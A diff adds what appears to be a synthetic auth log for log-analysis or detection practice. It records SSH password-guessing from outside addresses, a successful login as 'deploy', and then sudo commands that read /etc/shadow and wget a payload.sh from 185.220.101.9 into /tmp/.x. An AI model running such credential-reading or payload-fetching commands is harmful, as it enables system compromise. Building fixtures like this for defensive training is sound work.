@@ -1,0 +1,354 @@
+Sep 21 02:14:02 webserver01 sshd[6489]: Failed password for admin from 203.0.113.45 port 45447 ssh2
+Sep 21 02:14:03 webserver01 sshd[7052]: Failed password for root from 203.0.113.45 port 46850 ssh2
+Sep 21 02:14:04 webserver01 sshd[9493]: Failed password for oracle from 203.0.113.45 port 52539 ssh2
+Sep 21 02:14:06 webserver01 sshd[1452]: Failed password for root from 203.0.113.45 port 46797 ssh2
+Sep 21 02:14:08 webserver01 sshd[3992]: Failed password for admin from 203.0.113.45 port 47109 ssh2
+Sep 21 02:14:10 webserver01 sshd[6174]: Failed password for root from 203.0.113.45 port 41235 ssh2
+Sep 21 02:14:11 webserver01 sshd[8272]: Failed password for root from 203.0.113.45 port 46300 ssh2
+Sep 21 02:14:12 webserver01 sshd[5090]: Failed password for oracle from 203.0.113.45 port 49549 ssh2
+Sep 21 02:14:14 webserver01 sshd[5272]: Failed password for admin from 203.0.113.45 port 44467 ssh2
+Sep 21 02:14:14 webserver01 sshd[7072]: Failed password for root from 203.0.113.45 port 44890 ssh2
+Sep 21 02:14:16 webserver01 sshd[8680]: Failed password for root from 203.0.113.45 port 51185 ssh2
+Sep 21 02:14:17 webserver01 sshd[5314]: Failed password for oracle from 203.0.113.45 port 44154 ssh2
+Sep 21 02:14:19 webserver01 sshd[5740]: Failed password for root from 203.0.113.45 port 50867 ssh2
+Sep 21 02:14:20 webserver01 sshd[2937]: Failed password for admin from 203.0.113.45 port 47454 ssh2
+Sep 21 02:14:21 webserver01 sshd[9640]: Failed password for admin from 203.0.113.45 port 40071 ssh2
+Sep 21 02:14:22 webserver01 sshd[5305]: Failed password for oracle from 203.0.113.45 port 51229 ssh2
+Sep 21 02:14:24 webserver01 sshd[7281]: Failed password for root from 203.0.113.45 port 56579 ssh2
+Sep 21 02:14:25 webserver01 sshd[9886]: Failed password for root from 203.0.113.45 port 48198 ssh2
+Sep 21 02:14:27 webserver01 sshd[6875]: Failed password for admin from 203.0.113.45 port 54322 ssh2
+Sep 21 02:14:29 webserver01 sshd[1686]: Failed password for root from 203.0.113.45 port 40643 ssh2
+Sep 21 02:14:30 webserver01 sshd[6141]: Failed password for oracle from 203.0.113.45 port 55064 ssh2
+Sep 21 02:14:31 webserver01 sshd[1063]: Failed password for admin from 203.0.113.45 port 52320 ssh2
+Sep 21 02:14:33 webserver01 sshd[3590]: Failed password for root from 203.0.113.45 port 48737 ssh2
+Sep 21 02:14:34 webserver01 sshd[5951]: Failed password for root from 203.0.113.45 port 58748 ssh2
+Sep 21 02:14:35 webserver01 sshd[1268]: Failed password for oracle from 203.0.113.45 port 55881 ssh2
+Sep 21 02:14:37 webserver01 sshd[1426]: Failed password for oracle from 203.0.113.45 port 42613 ssh2
+Sep 21 02:14:38 webserver01 sshd[5651]: Failed password for admin from 203.0.113.45 port 44388 ssh2
+Sep 21 02:14:39 webserver01 sshd[1792]: Failed password for admin from 203.0.113.45 port 51685 ssh2
+Sep 21 02:14:41 webserver01 sshd[7599]: Failed password for oracle from 203.0.113.45 port 49424 ssh2
+Sep 21 02:14:42 webserver01 sshd[6179]: Failed password for root from 203.0.113.45 port 42260 ssh2
+Sep 21 02:14:43 webserver01 sshd[4155]: Failed password for root from 203.0.113.45 port 50400 ssh2
+Sep 21 02:14:45 webserver01 sshd[2377]: Failed password for root from 203.0.113.45 port 50604 ssh2
+Sep 21 02:14:46 webserver01 sshd[3927]: Failed password for root from 203.0.113.45 port 59392 ssh2
+Sep 21 02:14:48 webserver01 sshd[1627]: Failed password for root from 203.0.113.45 port 44386 ssh2
+Sep 21 02:14:50 webserver01 sshd[3317]: Failed password for root from 203.0.113.45 port 58528 ssh2
+Sep 21 02:14:51 webserver01 sshd[1456]: Failed password for oracle from 203.0.113.45 port 48218 ssh2
+Sep 21 02:14:52 webserver01 sshd[2064]: Failed password for admin from 203.0.113.45 port 44500 ssh2
+Sep 21 02:14:52 webserver01 sshd[5988]: Failed password for admin from 203.0.113.45 port 59516 ssh2
+Sep 21 02:14:53 webserver01 sshd[1122]: Failed password for root from 203.0.113.45 port 44588 ssh2
+Sep 21 02:14:55 webserver01 sshd[7474]: Failed password for admin from 203.0.113.45 port 52344 ssh2
+Sep 21 02:14:56 webserver01 sshd[4472]: Failed password for root from 203.0.113.45 port 51360 ssh2
+Sep 21 02:14:57 webserver01 sshd[4448]: Failed password for root from 203.0.113.45 port 43729 ssh2
+Sep 21 02:14:58 webserver01 sshd[3699]: Failed password for root from 203.0.113.45 port 58679 ssh2
+Sep 21 02:15:00 webserver01 sshd[4093]: Failed password for root from 203.0.113.45 port 42489 ssh2
+Sep 21 02:15:01 webserver01 sshd[6792]: Failed password for root from 203.0.113.45 port 45564 ssh2
+Sep 21 02:15:03 webserver01 sshd[1044]: Failed password for root from 203.0.113.45 port 44868 ssh2
+Sep 21 02:15:04 webserver01 sshd[2308]: Failed password for root from 203.0.113.45 port 54517 ssh2
+Sep 21 02:15:06 webserver01 sshd[6747]: Failed password for root from 203.0.113.45 port 46697 ssh2
+Sep 21 02:15:07 webserver01 sshd[8361]: Failed password for root from 203.0.113.45 port 59339 ssh2
+Sep 21 02:15:08 webserver01 sshd[2643]: Failed password for oracle from 203.0.113.45 port 49384 ssh2
+Sep 21 02:15:10 webserver01 sshd[5049]: Failed password for admin from 203.0.113.45 port 46458 ssh2
+Sep 21 02:15:12 webserver01 sshd[8261]: Failed password for oracle from 203.0.113.45 port 50291 ssh2
+Sep 21 02:15:14 webserver01 sshd[7730]: Failed password for oracle from 203.0.113.45 port 40303 ssh2
+Sep 21 02:15:15 webserver01 sshd[6184]: Failed password for admin from 203.0.113.45 port 56339 ssh2
+Sep 21 02:15:16 webserver01 sshd[9084]: Failed password for root from 203.0.113.45 port 56018 ssh2
+Sep 21 02:15:17 webserver01 sshd[2465]: Failed password for admin from 203.0.113.45 port 57251 ssh2
+Sep 21 02:15:17 webserver01 sshd[1315]: Failed password for root from 203.0.113.45 port 47208 ssh2
+Sep 21 02:15:18 webserver01 sshd[7923]: Failed password for oracle from 203.0.113.45 port 59910 ssh2
+Sep 21 02:15:20 webserver01 sshd[9251]: Failed password for oracle from 203.0.113.45 port 41185 ssh2
+Sep 21 02:15:22 webserver01 sshd[4850]: Failed password for admin from 203.0.113.45 port 53701 ssh2
+Sep 21 06:50:00 dbserver01 sshd[1537]: Failed password for svc_backup from 10.0.0.41 port 43871 ssh2
+Sep 21 06:50:04 dbserver01 sshd[3248]: Failed password for svc_backup from 10.0.0.41 port 45641 ssh2
+Sep 21 06:50:08 dbserver01 sshd[6603]: Failed password for svc_backup from 10.0.0.41 port 52301 ssh2
+Sep 21 06:50:12 dbserver01 sshd[6695]: Failed password for svc_backup from 10.0.0.41 port 58390 ssh2
+Sep 21 06:50:16 dbserver01 sshd[2896]: Failed password for svc_backup from 10.0.0.41 port 56682 ssh2
+Sep 21 06:50:20 dbserver01 sshd[4730]: Failed password for svc_backup from 10.0.0.41 port 59460 ssh2
+Sep 21 07:07:00 webserver01 sshd[6040]: Accepted password for bob from 10.0.0.5 port 51791 ssh2
+Sep 21 07:12:00 webserver01 sshd[2070]: Accepted password for jsmith from 192.168.1.10 port 53065 ssh2
+Sep 21 07:19:00 webserver01 sshd[1292]: Accepted password for deploy from 10.0.0.17 port 50185 ssh2
+Sep 21 07:22:00 webserver01 sshd[8490]: Accepted password for deploy from 192.168.1.22 port 50280 ssh2
+Sep 21 07:27:00 webserver01 sshd[1280]: Failed password for alice from 192.168.1.10 port 41763 ssh2
+Sep 21 07:27:10 webserver01 sshd[2713]: Accepted password for alice from 192.168.1.10 port 46456 ssh2
+Sep 21 07:36:10 webserver01 sshd[8080]: Accepted password for jsmith from 192.168.1.10 port 50931 ssh2
+Sep 21 07:40:00 dbserver01 sshd[8081]: Failed password for svc_backup from 10.0.0.41 port 54695 ssh2
+Sep 21 07:40:04 dbserver01 sshd[5998]: Failed password for svc_backup from 10.0.0.41 port 53954 ssh2
+Sep 21 07:40:08 dbserver01 sshd[4006]: Failed password for svc_backup from 10.0.0.41 port 52445 ssh2
+Sep 21 07:40:12 dbserver01 sshd[6584]: Failed password for svc_backup from 10.0.0.41 port 47816 ssh2
+Sep 21 07:40:16 dbserver01 sshd[3348]: Failed password for svc_backup from 10.0.0.41 port 59610 ssh2
+Sep 21 07:40:20 dbserver01 sshd[5385]: Failed password for svc_backup from 10.0.0.41 port 52077 ssh2
+Sep 21 07:41:10 webserver01 sshd[3962]: Accepted password for alice from 10.0.0.5 port 47000 ssh2
+Sep 21 07:45:10 webserver01 sshd[8457]: Accepted password for alice from 10.0.0.17 port 59128 ssh2
+Sep 21 07:47:10 webserver01 sshd[5215]: Accepted password for deploy from 10.0.0.5 port 58644 ssh2
+Sep 21 07:51:10 webserver01 sshd[4143]: Accepted password for alice from 192.168.1.22 port 42569 ssh2
+Sep 21 07:57:10 webserver01 sshd[1702]: Accepted password for alice from 192.168.1.22 port 59870 ssh2
+Sep 21 08:01:10 webserver01 sshd[4414]: Accepted password for alice from 10.0.0.17 port 42241 ssh2
+Sep 21 08:07:10 webserver01 sshd[8038]: Accepted password for bob from 192.168.1.22 port 52840 ssh2
+Sep 21 08:11:10 webserver01 sshd[7840]: Accepted password for bob from 10.0.0.5 port 46374 ssh2
+Sep 21 08:20:10 webserver01 sshd[4147]: Failed password for jsmith from 192.168.1.10 port 59659 ssh2
+Sep 21 08:20:27 webserver01 sshd[9947]: Accepted password for jsmith from 192.168.1.10 port 50057 ssh2
+Sep 21 08:28:27 webserver01 sshd[7210]: Accepted password for jsmith from 192.168.1.22 port 54420 ssh2
+Sep 21 08:30:00 dbserver01 sshd[5914]: Failed password for svc_backup from 10.0.0.41 port 46975 ssh2
+Sep 21 08:30:04 dbserver01 sshd[6572]: Failed password for svc_backup from 10.0.0.41 port 46538 ssh2
+Sep 21 08:30:08 dbserver01 sshd[6178]: Failed password for svc_backup from 10.0.0.41 port 44461 ssh2
+Sep 21 08:30:12 dbserver01 sshd[8512]: Failed password for svc_backup from 10.0.0.41 port 57782 ssh2
+Sep 21 08:30:16 dbserver01 sshd[2136]: Failed password for svc_backup from 10.0.0.41 port 54110 ssh2
+Sep 21 08:30:20 dbserver01 sshd[4902]: Failed password for svc_backup from 10.0.0.41 port 56583 ssh2
+Sep 21 08:36:27 webserver01 sshd[7314]: Accepted password for bob from 10.0.0.5 port 47756 ssh2
+Sep 21 08:39:27 webserver01 sshd[9056]: Accepted password for deploy from 192.168.1.10 port 49018 ssh2
+Sep 21 08:47:27 webserver01 sshd[7206]: Accepted password for bob from 192.168.1.10 port 56524 ssh2
+Sep 21 08:47:57 webserver01 sudo:  bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+Sep 21 08:56:27 webserver01 sshd[4481]: Accepted password for alice from 192.168.1.22 port 56110 ssh2
+Sep 21 09:03:27 webserver01 sshd[9287]: Accepted password for jsmith from 192.168.1.10 port 44998 ssh2
+Sep 21 09:05:27 webserver01 sshd[8633]: Failed password for deploy from 10.0.0.5 port 44854 ssh2
+Sep 21 09:05:33 webserver01 sshd[8496]: Accepted password for deploy from 10.0.0.5 port 56020 ssh2
+Sep 21 09:07:33 webserver01 sshd[1693]: Accepted password for bob from 192.168.1.22 port 47301 ssh2
+Sep 21 09:12:00 webserver01 sshd[4298]: Failed password for alice from 192.168.1.10 port 43277 ssh2
+Sep 21 09:12:03 webserver01 sshd[7996]: Failed password for alice from 192.168.1.10 port 42765 ssh2
+Sep 21 09:12:06 webserver01 sshd[2289]: Failed password for alice from 192.168.1.10 port 50498 ssh2
+Sep 21 09:12:09 webserver01 sshd[9229]: Failed password for alice from 192.168.1.10 port 50450 ssh2
+Sep 21 09:16:33 webserver01 sshd[1410]: Accepted password for deploy from 10.0.0.17 port 50250 ssh2
+Sep 21 09:20:00 dbserver01 sshd[5509]: Failed password for svc_backup from 10.0.0.41 port 46689 ssh2
+Sep 21 09:20:04 dbserver01 sshd[7614]: Failed password for svc_backup from 10.0.0.41 port 45935 ssh2
+Sep 21 09:20:08 dbserver01 sshd[4501]: Failed password for svc_backup from 10.0.0.41 port 49140 ssh2
+Sep 21 09:20:12 dbserver01 sshd[4624]: Failed password for svc_backup from 10.0.0.41 port 51778 ssh2
+Sep 21 09:20:16 dbserver01 sshd[7693]: Failed password for svc_backup from 10.0.0.41 port 44107 ssh2
+Sep 21 09:20:20 dbserver01 sshd[7803]: Failed password for svc_backup from 10.0.0.41 port 47108 ssh2
+Sep 21 09:23:33 webserver01 sshd[5903]: Failed password for alice from 192.168.1.22 port 40502 ssh2
+Sep 21 09:23:43 webserver01 sshd[4225]: Accepted password for alice from 192.168.1.22 port 45142 ssh2
+Sep 21 09:24:13 webserver01 sudo:  alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+Sep 21 09:27:43 webserver01 sshd[8055]: Accepted password for deploy from 192.168.1.22 port 41929 ssh2
+Sep 21 09:28:13 webserver01 sudo:  deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+Sep 21 09:35:43 webserver01 sshd[2210]: Accepted password for jsmith from 10.0.0.17 port 46362 ssh2
+Sep 21 09:36:13 webserver01 sudo:  jsmith : TTY=pts/0 ; PWD=/home/jsmith ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+Sep 21 09:39:43 webserver01 sshd[1002]: Accepted password for jsmith from 10.0.0.5 port 40907 ssh2
+Sep 21 09:44:43 webserver01 sshd[5560]: Accepted password for alice from 192.168.1.10 port 53049 ssh2
+Sep 21 09:50:43 webserver01 sshd[5905]: Accepted password for bob from 192.168.1.10 port 53576 ssh2
+Sep 21 09:52:43 webserver01 sshd[2461]: Accepted password for jsmith from 192.168.1.10 port 41853 ssh2
+Sep 21 09:54:43 webserver01 sshd[8752]: Accepted password for jsmith from 10.0.0.17 port 53015 ssh2
+Sep 21 09:55:13 webserver01 sudo:  jsmith : TTY=pts/0 ; PWD=/home/jsmith ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+Sep 21 10:03:43 webserver01 sshd[2443]: Failed password for bob from 192.168.1.22 port 46195 ssh2
+Sep 21 10:04:03 webserver01 sshd[7846]: Accepted password for bob from 192.168.1.22 port 45176 ssh2
+Sep 21 10:04:33 webserver01 sudo:  bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+Sep 21 10:07:03 webserver01 sshd[9567]: Accepted password for bob from 192.168.1.22 port 53930 ssh2
+Sep 21 10:10:00 dbserver01 sshd[8108]: Failed password for svc_backup from 10.0.0.41 port 42177 ssh2
+Sep 21 10:10:04 dbserver01 sshd[8295]: Failed password for svc_backup from 10.0.0.41 port 46838 ssh2
+Sep 21 10:10:08 dbserver01 sshd[8540]: Failed password for svc_backup from 10.0.0.41 port 45313 ssh2
+Sep 21 10:10:12 dbserver01 sshd[1115]: Failed password for svc_backup from 10.0.0.41 port 42039 ssh2
+Sep 21 10:10:16 dbserver01 sshd[8169]: Failed password for svc_backup from 10.0.0.41 port 40757 ssh2
+Sep 21 10:10:20 dbserver01 sshd[8163]: Failed password for svc_backup from 10.0.0.41 port 48940 ssh2
+Sep 21 10:13:03 webserver01 sshd[7009]: Accepted password for alice from 10.0.0.5 port 56075 ssh2
+Sep 21 10:20:03 webserver01 sshd[4540]: Accepted password for alice from 10.0.0.5 port 50832 ssh2
+Sep 21 10:20:33 webserver01 sudo:  alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+Sep 21 10:22:03 webserver01 sshd[1629]: Accepted password for alice from 10.0.0.17 port 53051 ssh2
+Sep 21 10:24:03 webserver01 sshd[6265]: Accepted password for alice from 10.0.0.17 port 42699 ssh2
+Sep 21 10:33:03 webserver01 sshd[6950]: Accepted password for bob from 192.168.1.10 port 59171 ssh2
+Sep 21 10:35:03 webserver01 sshd[3683]: Failed password for bob from 192.168.1.22 port 53393 ssh2
+Sep 21 10:35:11 webserver01 sshd[5346]: Accepted password for bob from 192.168.1.22 port 46597 ssh2
+Sep 21 10:42:11 webserver01 sshd[8738]: Accepted password for alice from 10.0.0.5 port 45357 ssh2
+Sep 21 10:45:11 webserver01 sshd[4355]: Accepted password for jsmith from 10.0.0.17 port 43556 ssh2
+Sep 21 10:49:11 webserver01 sshd[1911]: Failed password for bob from 192.168.1.22 port 40074 ssh2
+Sep 21 10:49:22 webserver01 sshd[3025]: Accepted password for bob from 192.168.1.22 port 51525 ssh2
+Sep 21 10:52:22 webserver01 sshd[2484]: Accepted password for deploy from 10.0.0.17 port 53227 ssh2
+Sep 21 10:52:52 webserver01 sudo:  deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+Sep 21 10:56:22 webserver01 sshd[1930]: Accepted password for jsmith from 192.168.1.22 port 57377 ssh2
+Sep 21 11:00:00 dbserver01 sshd[5424]: Failed password for svc_backup from 10.0.0.41 port 44160 ssh2
+Sep 21 11:00:04 dbserver01 sshd[3983]: Failed password for svc_backup from 10.0.0.41 port 47782 ssh2
+Sep 21 11:00:08 dbserver01 sshd[6568]: Failed password for svc_backup from 10.0.0.41 port 59332 ssh2
+Sep 21 11:00:12 dbserver01 sshd[9525]: Failed password for svc_backup from 10.0.0.41 port 44162 ssh2
+Sep 21 11:00:16 dbserver01 sshd[6123]: Failed password for svc_backup from 10.0.0.41 port 58962 ssh2
+Sep 21 11:00:20 dbserver01 sshd[5650]: Failed password for svc_backup from 10.0.0.41 port 49686 ssh2
+Sep 21 11:01:22 webserver01 sshd[6311]: Accepted password for alice from 10.0.0.5 port 49383 ssh2
+Sep 21 11:03:22 webserver01 sshd[9864]: Accepted password for jsmith from 10.0.0.17 port 42912 ssh2
+Sep 21 11:09:22 webserver01 sshd[3290]: Accepted password for jsmith from 192.168.1.10 port 41635 ssh2
+Sep 21 11:18:22 webserver01 sshd[1344]: Accepted password for jsmith from 192.168.1.22 port 56954 ssh2
+Sep 21 11:23:22 webserver01 sshd[9020]: Accepted password for deploy from 10.0.0.5 port 57202 ssh2
+Sep 21 11:31:22 webserver01 sshd[3925]: Accepted password for deploy from 192.168.1.22 port 52718 ssh2
+Sep 21 11:31:52 webserver01 sudo:  deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+Sep 21 11:38:22 webserver01 sshd[9580]: Accepted password for bob from 10.0.0.5 port 48868 ssh2
+Sep 21 11:40:03 webserver01 sshd[4981]: Failed password for invalid user admin from 198.51.100.77 port 54734 ssh2
+Sep 21 11:40:05 webserver01 sshd[6893]: Failed password for invalid user admin from 198.51.100.77 port 42687 ssh2
+Sep 21 11:40:07 webserver01 sshd[1653]: Failed password for invalid user admin from 198.51.100.77 port 41973 ssh2
+Sep 21 11:40:09 webserver01 sshd[2463]: Failed password for invalid user test from 198.51.100.77 port 58745 ssh2
+Sep 21 11:40:11 webserver01 sshd[9719]: Failed password for invalid user test from 198.51.100.77 port 59197 ssh2
+Sep 21 11:40:12 webserver01 sshd[2578]: Failed password for invalid user test from 198.51.100.77 port 53907 ssh2
+Sep 21 11:40:13 webserver01 sshd[3170]: Failed password for invalid user oracle from 198.51.100.77 port 50179 ssh2
+Sep 21 11:40:16 webserver01 sshd[7725]: Failed password for invalid user oracle from 198.51.100.77 port 55770 ssh2
+Sep 21 11:40:19 webserver01 sshd[5152]: Failed password for invalid user oracle from 198.51.100.77 port 56439 ssh2
+Sep 21 11:40:22 webserver01 sshd[9091]: Failed password for invalid user ubuntu from 198.51.100.77 port 42693 ssh2
+Sep 21 11:40:25 webserver01 sshd[5685]: Failed password for invalid user ubuntu from 198.51.100.77 port 58640 ssh2
+Sep 21 11:40:29 webserver01 sshd[1408]: Failed password for invalid user ubuntu from 198.51.100.77 port 52118 ssh2
+Sep 21 11:40:31 webserver01 sshd[6473]: Failed password for invalid user guest from 198.51.100.77 port 41877 ssh2
+Sep 21 11:40:34 webserver01 sshd[7760]: Failed password for invalid user guest from 198.51.100.77 port 58768 ssh2
+Sep 21 11:40:37 webserver01 sshd[8141]: Failed password for invalid user guest from 198.51.100.77 port 40273 ssh2
+Sep 21 11:40:40 webserver01 sshd[3203]: Failed password for invalid user postgres from 198.51.100.77 port 59960 ssh2
+Sep 21 11:40:42 webserver01 sshd[5281]: Failed password for invalid user postgres from 198.51.100.77 port 53941 ssh2
+Sep 21 11:40:45 webserver01 sshd[6273]: Failed password for invalid user postgres from 198.51.100.77 port 59984 ssh2
+Sep 21 11:40:47 webserver01 sshd[2377]: Failed password for invalid user ftp from 198.51.100.77 port 57747 ssh2
+Sep 21 11:40:51 webserver01 sshd[1207]: Failed password for invalid user ftp from 198.51.100.77 port 53053 ssh2
+Sep 21 11:40:55 webserver01 sshd[6072]: Failed password for invalid user ftp from 198.51.100.77 port 58005 ssh2
+Sep 21 11:40:57 webserver01 sshd[2515]: Failed password for invalid user pi from 198.51.100.77 port 47103 ssh2
+Sep 21 11:41:01 webserver01 sshd[7567]: Failed password for invalid user pi from 198.51.100.77 port 40700 ssh2
+Sep 21 11:41:03 webserver01 sshd[2082]: Failed password for invalid user pi from 198.51.100.77 port 49173 ssh2
+Sep 21 11:41:04 webserver01 sshd[6763]: Failed password for invalid user jenkins from 198.51.100.77 port 54298 ssh2
+Sep 21 11:41:05 webserver01 sshd[7483]: Failed password for invalid user jenkins from 198.51.100.77 port 46543 ssh2
+Sep 21 11:41:08 webserver01 sshd[7741]: Failed password for invalid user jenkins from 198.51.100.77 port 57966 ssh2
+Sep 21 11:41:11 webserver01 sshd[4107]: Failed password for invalid user git from 198.51.100.77 port 57998 ssh2
+Sep 21 11:41:13 webserver01 sshd[8293]: Failed password for invalid user git from 198.51.100.77 port 56210 ssh2
+Sep 21 11:41:16 webserver01 sshd[4891]: Failed password for invalid user git from 198.51.100.77 port 53849 ssh2
+Sep 21 11:41:19 webserver01 sshd[4644]: Failed password for alice from 198.51.100.77 port 54428 ssh2
+Sep 21 11:41:22 webserver01 sshd[3113]: Accepted password for bob from 192.168.1.22 port 53529 ssh2
+Sep 21 11:41:22 webserver01 sshd[8970]: Failed password for alice from 198.51.100.77 port 41405 ssh2
+Sep 21 11:41:25 webserver01 sshd[1601]: Failed password for alice from 198.51.100.77 port 49385 ssh2
+Sep 21 11:41:27 webserver01 sshd[7619]: Failed password for bob from 198.51.100.77 port 45618 ssh2
+Sep 21 11:41:31 webserver01 sshd[2064]: Failed password for bob from 198.51.100.77 port 45254 ssh2
+Sep 21 11:41:33 webserver01 sshd[9527]: Failed password for bob from 198.51.100.77 port 55195 ssh2
+Sep 21 11:41:34 webserver01 sshd[1770]: Failed password for deploy from 198.51.100.77 port 41571 ssh2
+Sep 21 11:41:38 webserver01 sshd[7439]: Failed password for deploy from 198.51.100.77 port 58099 ssh2
+Sep 21 11:41:41 webserver01 sshd[8786]: Failed password for deploy from 198.51.100.77 port 45240 ssh2
+Sep 21 11:41:44 webserver01 sshd[6224]: Failed password for root from 198.51.100.77 port 58065 ssh2
+Sep 21 11:41:46 webserver01 sshd[5847]: Failed password for root from 198.51.100.77 port 41565 ssh2
+Sep 21 11:41:47 webserver01 sshd[2133]: Failed password for root from 198.51.100.77 port 45158 ssh2
+Sep 21 11:41:56 webserver01 sshd[9295]: Accepted password for deploy from 198.51.100.77 port 40685 ssh2
+Sep 21 11:43:56 webserver01 sudo:  deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/cat /etc/shadow
+Sep 21 11:44:36 webserver01 sudo:  deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/wget http://185.220.101.9/payload.sh -O /tmp/.x
+Sep 21 11:45:22 webserver01 sshd[1286]: Accepted password for deploy from 10.0.0.5 port 58057 ssh2
+Sep 21 11:50:00 dbserver01 sshd[7131]: Failed password for svc_backup from 10.0.0.41 port 56163 ssh2
+Sep 21 11:50:04 dbserver01 sshd[5322]: Failed password for svc_backup from 10.0.0.41 port 51554 ssh2
+Sep 21 11:50:08 dbserver01 sshd[5413]: Failed password for svc_backup from 10.0.0.41 port 40858 ssh2
+Sep 21 11:50:12 dbserver01 sshd[9280]: Failed password for svc_backup from 10.0.0.41 port 51401 ssh2
+Sep 21 11:50:16 dbserver01 sshd[8985]: Failed password for svc_backup from 10.0.0.41 port 49209 ssh2
+Sep 21 11:50:20 dbserver01 sshd[4558]: Failed password for svc_backup from 10.0.0.41 port 44491 ssh2
+Sep 21 11:51:22 webserver01 sshd[8500]: Accepted password for alice from 10.0.0.17 port 56825 ssh2
+Sep 21 11:54:22 webserver01 sshd[2110]: Accepted password for alice from 192.168.1.22 port 47587 ssh2
+Sep 21 11:56:22 webserver01 sshd[3527]: Accepted password for alice from 192.168.1.10 port 50406 ssh2
+Sep 21 12:03:22 webserver01 sshd[6627]: Accepted password for bob from 10.0.0.5 port 49944 ssh2
+Sep 21 12:11:22 webserver01 sshd[2641]: Failed password for jsmith from 192.168.1.22 port 52960 ssh2
+Sep 21 12:11:39 webserver01 sshd[7542]: Accepted password for jsmith from 192.168.1.22 port 53872 ssh2
+Sep 21 12:12:09 webserver01 sudo:  jsmith : TTY=pts/0 ; PWD=/home/jsmith ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+Sep 21 12:14:39 webserver01 sshd[4007]: Accepted password for bob from 192.168.1.10 port 56962 ssh2
+Sep 21 12:21:39 webserver01 sshd[9772]: Accepted password for jsmith from 10.0.0.17 port 40052 ssh2
+Sep 21 12:28:39 webserver01 sshd[4646]: Accepted password for deploy from 192.168.1.10 port 58617 ssh2
+Sep 21 12:36:39 webserver01 sshd[4807]: Failed password for alice from 10.0.0.5 port 40439 ssh2
+Sep 21 12:36:59 webserver01 sshd[8466]: Accepted password for alice from 10.0.0.5 port 48688 ssh2
+Sep 21 12:40:00 dbserver01 sshd[3370]: Failed password for svc_backup from 10.0.0.41 port 52725 ssh2
+Sep 21 12:40:04 dbserver01 sshd[2114]: Failed password for svc_backup from 10.0.0.41 port 44546 ssh2
+Sep 21 12:40:08 dbserver01 sshd[2752]: Failed password for svc_backup from 10.0.0.41 port 47869 ssh2
+Sep 21 12:40:12 dbserver01 sshd[6134]: Failed password for svc_backup from 10.0.0.41 port 47833 ssh2
+Sep 21 12:40:16 dbserver01 sshd[6392]: Failed password for svc_backup from 10.0.0.41 port 58936 ssh2
+Sep 21 12:40:20 dbserver01 sshd[6850]: Failed password for svc_backup from 10.0.0.41 port 53840 ssh2
+Sep 21 12:45:59 webserver01 sshd[8556]: Accepted password for bob from 192.168.1.10 port 50299 ssh2
+Sep 21 12:47:59 webserver01 sshd[4068]: Accepted password for bob from 10.0.0.17 port 57787 ssh2
+Sep 21 12:53:59 webserver01 sshd[6047]: Accepted password for jsmith from 192.168.1.22 port 57465 ssh2
+Sep 21 13:02:59 webserver01 sshd[2789]: Failed password for deploy from 10.0.0.17 port 51140 ssh2
+Sep 21 13:03:15 webserver01 sshd[2736]: Accepted password for deploy from 10.0.0.17 port 51253 ssh2
+Sep 21 13:08:15 webserver01 sshd[4585]: Accepted password for bob from 10.0.0.5 port 54528 ssh2
+Sep 21 13:11:15 webserver01 sshd[2824]: Failed password for deploy from 10.0.0.5 port 41100 ssh2
+Sep 21 13:11:25 webserver01 sshd[4153]: Accepted password for deploy from 10.0.0.5 port 47542 ssh2
+Sep 21 13:19:25 webserver01 sshd[1279]: Accepted password for deploy from 192.168.1.10 port 41151 ssh2
+Sep 21 13:19:55 webserver01 sudo:  deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+Sep 21 13:24:25 webserver01 sshd[9551]: Accepted password for alice from 10.0.0.5 port 56007 ssh2
+Sep 21 13:29:25 webserver01 sshd[6547]: Accepted password for alice from 10.0.0.5 port 44337 ssh2
+Sep 21 13:30:00 dbserver01 sshd[4388]: Failed password for svc_backup from 10.0.0.41 port 45601 ssh2
+Sep 21 13:30:04 dbserver01 sshd[1241]: Failed password for svc_backup from 10.0.0.41 port 50138 ssh2
+Sep 21 13:30:08 dbserver01 sshd[6763]: Failed password for svc_backup from 10.0.0.41 port 49855 ssh2
+Sep 21 13:30:12 dbserver01 sshd[8692]: Failed password for svc_backup from 10.0.0.41 port 48641 ssh2
+Sep 21 13:30:16 dbserver01 sshd[6776]: Failed password for svc_backup from 10.0.0.41 port 41236 ssh2
+Sep 21 13:30:20 dbserver01 sshd[2097]: Failed password for svc_backup from 10.0.0.41 port 47407 ssh2
+Sep 21 13:35:25 webserver01 sshd[8260]: Accepted password for jsmith from 10.0.0.17 port 43437 ssh2
+Sep 21 13:37:25 webserver01 sshd[5533]: Accepted password for alice from 192.168.1.22 port 49196 ssh2
+Sep 21 13:37:55 webserver01 sudo:  alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+Sep 21 13:41:25 webserver01 sshd[2585]: Accepted password for bob from 192.168.1.22 port 45609 ssh2
+Sep 21 13:48:25 webserver01 sshd[9553]: Accepted password for jsmith from 192.168.1.10 port 48735 ssh2
+Sep 21 13:56:25 webserver01 sshd[5517]: Accepted password for alice from 10.0.0.17 port 46319 ssh2
+Sep 21 14:02:25 webserver01 sshd[5222]: Accepted password for deploy from 192.168.1.10 port 57209 ssh2
+Sep 21 14:06:25 webserver01 sshd[8489]: Accepted password for jsmith from 10.0.0.5 port 56245 ssh2
+Sep 21 14:06:55 webserver01 sudo:  jsmith : TTY=pts/0 ; PWD=/home/jsmith ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
